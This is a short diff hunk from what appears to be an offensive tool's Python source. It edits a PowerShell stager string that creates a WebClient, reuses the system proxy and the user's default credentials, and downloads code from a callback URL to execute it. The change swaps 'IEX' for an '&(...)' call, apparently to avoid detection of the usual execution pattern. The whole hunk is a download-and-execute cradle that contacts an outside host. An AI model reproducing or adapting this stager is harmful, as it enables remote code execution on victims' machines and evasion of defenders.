@@ -116,5 +116,5 @@ stager_str = (
     "$K=new-object net.webclient;"
     "$K.proxy=[Net.WebRequest]::GetSystemWebProxy();"
     "$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
-    "IEX $K.downloadstring('%s');"
+    "&($K.downloadstring('%s'));"
 ) % callback_url
